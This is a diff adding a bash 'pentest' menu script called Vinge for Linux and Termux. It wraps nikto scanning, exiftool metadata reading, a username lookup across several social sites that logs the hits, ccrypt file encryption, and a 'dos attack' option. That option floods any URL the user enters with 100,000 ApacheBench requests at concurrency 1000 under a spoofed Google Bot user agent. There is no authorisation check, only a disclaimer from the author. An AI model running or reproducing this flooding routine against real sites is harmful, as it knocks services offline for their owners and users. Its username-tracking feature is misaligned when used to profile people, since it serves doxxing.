@@ -1,0 +1,515 @@
+#!/bin/bash
+#shyno
+#Vinge
+#version: 1.0.0
+
+chmod -R a+rx *;
+number='^[0-9]+$';
+
+
+banner()
+{
+clear;
+sleep 0.1;
+echo -e '\e[1;37m    ______\e[0m';
+echo -e '\e[1;37m  _|      |_  \e[1;37mVinge\e[0m';
+echo -e '\e[1;37m (__________) \e[1;30mv.1.0.0\e[0m';
+echo "";
+}
+
+
+error()
+{
+clear;
+echo -e "\e[1;31mERROR: write the correct sign..\e[0m";
+sleep 0.6;
+}
+
+
+input()
+{
+echo "";
+echo -en "\e[1;30m (\e[0m""\e[37m#\e[0m""\e[1;30m_\e[0m""\e[37m#\e[0m";
+echo -en "\e[1;30m)\e[0m" "\e[1;37m> \e[0m";
+}
+
+
+backOrExit()
+{
+echo -e "\e[1;30mTo back: 'b' | To exit: 'x'\e[0m";
+echo "";
+}
+
+
+anyKey()
+{
+echo "";
+echo -en "\e[1;30mpress any key: \e[0m";
+ read choice
+    case $choice in
+"") $1; ;;
+*) $1; ;;
+    esac;
+}
+
+
+userAgreement()
+{
+banner;
+echo -e "\e[1;30muser agreement\e[0m";
+echo "";
+echo -e "\e[37mAre you agree that author not\e[0m";
+echo -e "\e[37mbring responsibility to you\e[0m";
+echo "";
+echo -en "\e[1;30m/ \e[0m""\e[37m0\e[0m"
+echo -e "\e[1;30m / \e[0m""\e[37myes\e[0m";
+echo -en "\e[1;30m/ \e[0m""\e[37m1\e[0m"
+echo -e "\e[1;30m / \e[0m""\e[37mno\e[0m";
+input;
+ read filePath
+  case $filePath in
+0) installing; ;;
+1) echo ""; exit 0; ;;
+*) error; userAgreement; ;;
+  esac;
+}
+
+
+installing()
+{
+#installing dependencies
+#termux
+  if [[ -d /data/data/com.termux/files/usr/bin ]]; then
+os="termux";
+    if [[ ! -f /data/data/com.termux/files/usr/bin/exiftool ]]; then
+pkg install exiftool -y;
+    fi
+      if [[ ! -f /data/data/com.termux/files/usr/bin/ccrypt ]]; then
+pkg install ccrypt -y;
+      fi;
+        if [[ ! -f /data/data/com.termux/files/usr/bin/apachectl ]]; then
+pkg install apache2 -y
+        fi
+          if [[ ! -f /data/data/com.termux/files/usr/bin/perl ]]; then
+pkg install perl -y;
+          fi;
+#linux
+  else
+os="linux";
+    if [[ ! -f /usr/bin/exiftool ]]; then
+sudo apt install libimage-exiftool-perl -y;
+    fi;
+      if [[ ! -f /usr/bin/ccrypt ]]; then
+sudo apt install ccrypt -y;
+      fi;
+        if [[ ! -f /usr/bin/nikto ]]; then
+sudo apt install nikto -y;
+        fi;
+#          if [[ ! -f /usr/bin/nikto ]]; then
+#echo
+#          fi;
+  fi;
+shyno;
+}
+
+
+internetChecking()
+{
+ping -c 1 google.com | grep "ping" > /dev/null;
+    case $? in
+0) $1; ;;
+*) banner; echo -e "\e[1;30mInternet not available\e[0m"; sleep 1; $2; ;;
+    esac;
+}
+
+
+decryptFile()
+{
+banner;
+backOrExit;
+echo -e "\e[1;30mdecrypt file\e[0m";
+echo "";
+echo -en "\e[37mEnter the path to file: \e[0m";
+ read filePath
+echo "";
+  if [[ $filePath == "x" ]]; then
+echo ""; exit 0;
+  elif [[ $filePath == "b" ]]; then
+encryptOrDecryptFile;
+  elif [[ $filePath =~ $number ]]; then
+error; decryptFile;
+  elif [[ $filePath == "" ]]; then
+error; decryptFile;
+  else
+ccdecrypt "$filePath";
+  case $? in
+0) #checking the last signs
+    if [[ ${filePath: -4} == '.cpt' ]]; then
+filePath=$( echo $filePath| rev | cut -c 5- | rev );
+    fi;
+mv "$filePath" data/files/decryptedFiles/;
+banner;
+echo -en "\e[1;37m$filePath \e[0m";
+echo -e "\e[1;30mis successfully decrypted";
+echo -en "\e[1;30mThe file is located in \e[0m"
+echo -e "\e[1;37mVinge/data/files/decryptedFiles\e[0m"; ;;
+  esac;
+anyKey encryptOrDecryptFile;
+  fi;
+}
+
+
+encryptFile()
+{
+banner;
+backOrExit;
+echo -e "\e[1;30mencrypt file\e[0m";
+echo "";
+echo -en "\e[37mEnter the path to file: \e[0m";
+ read filePath
+echo "";
+  if [[ $filePath == "x" ]]; then
+echo ""; exit 0;
+  elif [[ $filePath == "b" ]]; then
+encryptOrDecryptFile;
+  elif [[ $filePath =~ $number ]]; then
+error; encryptFile;
+  elif [[ $filePath == "" ]]; then
+error; encryptFile;
+  else
+ccencrypt "$filePath";
+    case $? in
+0) banner;
+mv "$filePath.cpt" data/files/encryptedFiles/;
+echo -en "\e[1;37m$filePath \e[0m";
+echo -e "\e[1;30mis successfully encrypted";
+echo -en "\e[1;30mThe file is located in \e[0m"
+echo -e "\e[1;37mVinge/data/files/encryptedFiles\e[0m"; ;;
+    esac;
+anyKey encryptOrDecryptFile;
+  fi;
+}
+
+
+encryptOrDecryptFile()
+{
+banner;
+backOrExit;
+echo -e "\e[37m1.encrypt\e[0m";
+echo -e "\e[37m2.decrypt\e[0m";
+input;
+ read choice
+    case $choice in
+1) encryptFile; ;;
+2) decryptFile; ;;
+"b") pentest; ;;
+"x") echo ""; exit 0; ;;
+*) error; encryptOrDecryptFile; ;;
+    esac;
+}
+
+
+dosAttack()
+{
+banner;
+backOrExit;
+echo -e "\e[1;30mdos attack\e[0m";
+echo "";
+echo -en "\e[1;37mEnter the URL of site: \e[0m";
+ read url
+#checking url and "/" sign
+    if [[ $url == "" || $url =~ $number ]]; then
+error; dosAttack
+    elif [[ $url == "b" ]]; then
+pentest;
+    elif [[ $url == "x" ]]; then
+echo ""; exit 0;
+    else
+#dos
+urlChecking=$( curl -Is $url | head -1; );
+      case $urlChecking in
+"") banner;
+echo -e "\e[1;30m$url\e[0m" "\e[1;37msite doesn't exist\e[0m";
+anyKey dosAttack; ;;
+*) banner;
+echo -e "\e[1;30mFor stopping: CTRL+C\e[0m";
+echo "";
+  if [[ "${url:${#url}-1}" == "/" ]]; then
+ab -n 100000 -c 1000 -k -r -H "User-Agent: Google Bot", "$url";
+  else
+ab -n 100000 -c 1000 -k -r -H "User-Agent: Google Bot", "$url"/;
+  fi;
+anyKey pentest; ;;
+      esac;
+    fi;
+pentest;
+}
+
+
+nickExist()
+{
+link=$(curl -s -i "https://$url$nick" -H "Accept-Language: en" -L | grep -o "$siteError"; echo $?);
+  case $link in
+*'1'*) echo -e "\e[1;30m$siteName:\e[0m" "\e[1;37mhttps://$url$nick\e[0m";
+echo "$siteName:" "https://$url$nick" >> data/log/searchByNick/searchByNick.md; ;;
+*'0'*) echo -e "\e[1;30m$siteName:\e[0m" "\e[37mnot found\e[0m";
+echo "$siteName:" "not found" >> data/log/searchByNick/searchByNick.md; ;;
+  esac;
+}
+
+
+searchByNick()
+{
+banner;
+backOrExit;
+echo -e "\e[1;30msearch by nick\e[0m";
+echo "";
+echo -en "\e[37mEnter nick: \e[0m";
+ read nick
+  case $nick in
+"b") pentest; ;;
+"x") echo ""; exit 0; ;;
+"") error; searchByNick; ;;
+*) echo "";
+echo "" >> data/log/searchByNick/searchByNick.md;
+echo "" >> data/log/searchByNick/searchByNick.md;
+#vk
+siteName="vk"; url="vk.com/"; siteError='HTTP/2 404'; nickExist;
+#facebook
+siteName="facebook"; url="www.facebook.com/"; siteError='not found'; nickExist;
+#youtube
+siteName="youtube"; url="www.youtube.com/"; siteError='Not Found'; nickExist;
+#steam
+siteName="steam"; url="steamcommunity.com/id/";
+siteError='The specified profile could not be found'; nickExist;
+#ebay
+siteName="ebay"; url="www.ebay.com/usr/";
+siteError='HTTP/2 404\|404 Not Found\|eBay Profile - error';nickExist;
+#spotify
+siteName="spotify"; url="open.spotify.com/user/"; siteError='HTTP/2 404'; nickExist;
+#hackerNews
+siteName="hackerNews"; url="news.ycombinator.com/user?id=";
+siteError='No such user'; nickExist; ;;
+  esac;
+anyKey pentest;
+}
+
+
+metadata()
+{
+banner;
+backOrExit;
+echo -e "\e[1;30mmetadata\e[0m";
+echo "";
+echo -en "\e[37mEnter the path to file: \e[0m";
+ read filePath
+echo "";
+  if [[ $filePath == "x" ]]; then
+echo ""; exit 0;
+  elif [[ $filePath == "b" ]]; then
+pentest;
+  elif [[ $filePath =~ $number ]]; then
+error; metadata;
+  elif [[ $filePath == "" ]]; then
+error; metadata;
+  else
+echo "" >> data/log/metadata/metadata.md;
+echo "" >> data/log/metadata/metadata.md;
+exiftool "$filePath" | tee -a data/log/metadata/metadata.md;
+anyKey pentest;
+  fi;
+}
+
+
+siteInfo()
+{
+banner;
+backOrExit;
+echo -e "\e[1;30msite info\e[0m";
+echo "";
+echo -en "\e[37mEnter the URL: \e[0m";
+ read url
+echo "";
+  if [[ $url == "x" ]]; then
+echo ""; exit 0;
+  elif [[ $url == "b" ]]; then
+pentest;
+  elif [[ $url =~ $number ]]; then
+error; siteInfo;
+  elif [[ $url == "" ]]; then
+error; siteInfo;
+  else
+urlChecking=$( curl -Is $url | head -1; echo $? );
+    case $urlChecking in
+"") banner;
+echo -e "\e[1;30m$url\e[0m" "\e[1;37msite doesn't exist\e[0m";
+anyKey siteInfo; ;;
+*) #scanning
+      case $os in
+"linux")
+echo "" >> data/log/siteInfo/siteInfo.md;
+echo "" >> data/log/siteInfo/siteInfo.md;
+nikto -h $url | tee -a data/log/siteInfo/siteInfo.md;
+anyKey pentest; ;;
+"termux")
+echo "" >> data/log/siteInfo/siteInfo.md;
+echo "" >> data/log/siteInfo/siteInfo.md;
+perl data/lib/siteInfo/nikto.pl -h $url | tee -a data/log/siteInfo/siteInfo.md;
+anyKey pentest; ;;
+      esac;
+    esac;
+  fi;
+
+}
+
+
+pentest()
+{
+banner;
+backOrExit;
+#nickInfo
+echo -en "\e[1;30m/ \e[0m""\e[37m1\e[0m"
+echo -e "\e[1;30m / \e[0m""\e[37msite info\e[0m";
+echo -en "\e[1;30m/ \e[0m""\e[37m2\e[0m"
+echo -e "\e[1;30m / \e[0m""\e[37mmetadata\e[0m";
+echo -en "\e[1;30m/ \e[0m""\e[37m3\e[0m"
+echo -e "\e[1;30m / \e[0m""\e[37msearch by nick\e[0m";
+echo -en "\e[1;30m/ \e[0m""\e[37m4\e[0m"
+echo -e "\e[1;30m / \e[0m""\e[37mdos attack\e[0m";
+echo -en "\e[1;30m/ \e[0m""\e[37m5\e[0m"
+echo -e "\e[1;30m / \e[0m""\e[37mencrypt file\e[0m";
+input;
+ read choice
+  case $choice in
+1) internetChecking siteInfo pentest; ;;
+2) metadata; ;;
+3) internetChecking searchByNick pentest; ;;
+4) internetChecking dosAttack pentest; ;;
+5) encryptOrDecryptFile; ;;
+"b") shyno; ;;
+"x") echo ""; exit 0; ;;
+*) error; pentest; ;;
+  esac;
+}
+
+
+clearLogExtraBlock()
+{
+banner;
+echo -e "\e[1;30m$logChoice cleared\e[0m"; sleep 1; clearLog;
+}
+
+
+clearLog()
+{
+banner;
+backOrExit;
+echo -e "\e[1;30mclear log\e[0m";
+echo "";
+echo -e "\e[37m1.site info\e[0m";
+echo -e "\e[37m2.metadata\e[0m";
+echo -e "\e[37m3.search by nick\e[0m";
+echo "";
+echo -e "\e[37m0.all\e[0m";
+input
+ read choice
+  case $choice in
+1) logChoice="site info log";
+echo '#site info log' > data/log/siteInfo/siteInfo.md; ;;
+2) logChoice="metadata log";
+echo '#metadata log' > data/log/metadata/metadata.md; ;;
+3) logChoice="search by nick log";
+echo '#search by nick log' > data/log/searchByNick/searchByNick.md; ;;
+0) logChoice="all log";
+echo '#site info log' > data/log/siteInfo/siteInfo.md;
+echo '#metadata log' > data/log/metadata/metadata.md;
+echo '#search by nick log' > data/log/searchByNick/searchByNick.md; ;;
+"b") log; ;;
+"x") echo ""; exit 0; ;;
+*) error; clearLog; ;;
+  esac;
+clearLogExtraBlock; clearLog;
+}
+
+
+openLog()
+{
+banner;
+backOrExit;
+echo -e "\e[1;30mopen log\e[0m";
+echo "";
+echo -e "\e[37m1.site info\e[0m";
+echo -e "\e[37m2.metadata\e[0m";
+echo -e "\e[37m3.search by nick\e[0m";
+input
+ read choice
+  case $choice in
+1) clear; less data/log/siteInfo/siteInfo.md; openLog; ;;
+2) clear; less data/log/metadata/metadata.md; openLog; ;;
+3) clear; less data/log/searchByNick/searchByNick.md; openLog; ;;
+"b") log; ;;
+"x") echo ""; exit 0; ;;
+*) error; openLog; ;;
+  esac;
+}
+
+
+log()
+{
+banner;
+backOrExit;
+echo -e "\e[37m1.open log\e[0m";
+echo -e "\e[37m2.clear log\e[0m";
+input
+ read choice
+  case $choice in
+1) openLog; ;;
+2) clearLog; ;;
+"b") shyno; ;;
+"x") echo ""; exit 0; ;;
+*) error; log; ;;
+  esac;
+}
+
+
+aboutProgram()
+{
+banner;
+echo -e "\e[1;30mTo back: 'b' | To exit: 'x'\e[0m";
+echo -e "\e[1;30mTo update: 'u'\e[0m";
+echo "";
+echo -e "\e[1;30mProgram:\e[0m" "\e[1;37mVinge\e[0m";
+echo -e "\e[1;30mCreator:\e[0m" "\e[1;37mshyno\e[0m";
+echo -e "\e[1;30mVk:\e[0m" "\e[1;37mhttps://vk.com/shynolinux\e[0m";
+input;
+ read choice
+    case $choice in
+"u") ./data/update/update.sh; ./Vinge; ;;
+"b") shyno; ;;
+"x") echo ""; exit 0; ;;
+    esac;
+}
+
+
+shyno()
+{
+banner;
+echo -e "\e[1;30mTo exit: 'x'\e[0m";
+echo "";
+echo -en "\e[1;30m/ \e[0m""\e[37m1\e[0m"
+echo -e "\e[1;30m / \e[0m""\e[37mpentest\e[0m";
+echo -en "\e[1;30m/ \e[0m""\e[37m2\e[0m"
+echo -e "\e[1;30m / \e[0m""\e[37mlog\e[0m";
+echo -en "\e[1;30m/ \e[0m""\e[37m3\e[0m"
+echo -e "\e[1;30m / \e[0m""\e[37mabout program\e[0m";
+input;
+ read choice
+  case $choice in
+1) pentest; ;;
+2) log; ;;
+3) aboutProgram; ;;
+"x") echo ""; exit 0; ;;
+*) error; shyno; ;;
+  esac;
+}
+userAgreement;
